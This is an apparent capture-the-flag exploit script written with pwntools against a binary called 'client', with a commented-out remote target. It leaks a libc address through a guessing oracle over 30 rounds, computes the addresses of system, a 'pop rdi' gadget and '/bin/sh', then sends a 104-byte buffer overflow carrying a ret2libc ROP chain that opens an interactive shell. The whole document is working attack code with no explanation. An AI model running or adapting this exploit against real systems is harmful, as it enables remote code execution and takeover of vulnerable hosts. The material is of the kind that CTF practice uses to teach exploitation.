from pwn import *
import string
import math
context.log_level = "debug"
context.arch = "amd64"
context.endian = "little"
context.binary = binary = ELF('./client')
p = process("./client")
# p = remote("sisterlab.id", 42069)
libc = ELF('./libc.so.6')


p.sendlineafter("> ", b"30")

arr = []

for i in range(30):
    answer = b"Nope."
    divider = b"10"
    while(answer==b"Nope."):
        p.sendlineafter("> ", b"y")
        p.sendlineafter("> ", b"4")
        p.sendlineafter("> ", divider)
        p.sendlineafter("> ", b"0")
        answer = p.recvuntil(f"Round {i+1}\n")
        if(i>=9):
            answer = answer[:-10]
        else:
            answer = answer[:-9]
        divider = divider + b"0"
    divider = divider[:-2]
    sum = 0

    while(divider!=b''):
        num = -1
        answer = b"Nope."
        while(answer==b"Nope."):
            num+=1
            p.sendlineafter("> ", b"y")
            p.sendlineafter("> ", b"4")
            p.sendlineafter("> ", divider)

            p.sendlineafter("> ", f"{sum+num}")
            sent = sum+num
            print("sent === ",sent)
            answer = p.recvuntil(f"Round {i+1}\n")
            if(i>=9):
                answer = answer[:-10]
            else:
                answer = answer[:-9]
            # print("num === ", num)
            print("answer === ", answer)
            
        print("divider then == ", divider)
        divider = divider[:-1]
        sum += num
        sum *= 10
        print("divider now == ", divider)

    print("the number is ============================================================",sent)
    p.sendlineafter("> ", b"n")
    p.sendlineafter("> ", f"{sent}")
    arr.append(sent)



libc_main = arr[29] - 0x7A
system = libc_main + 0x2E600
pop_rdi = system + 0xB700B
binsh = system + 0x172CDF
libc_base = libc_main - libc.symbols['__libc_start_main']
print("binsh=== ", hex(binsh))
print("libc system===", hex(system))
print("lafsfasfas ==== ", hex(pop_rdi))

payload = b"A"*104 + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(system)
p.sendlineafter("> ", payload)

p.interactive()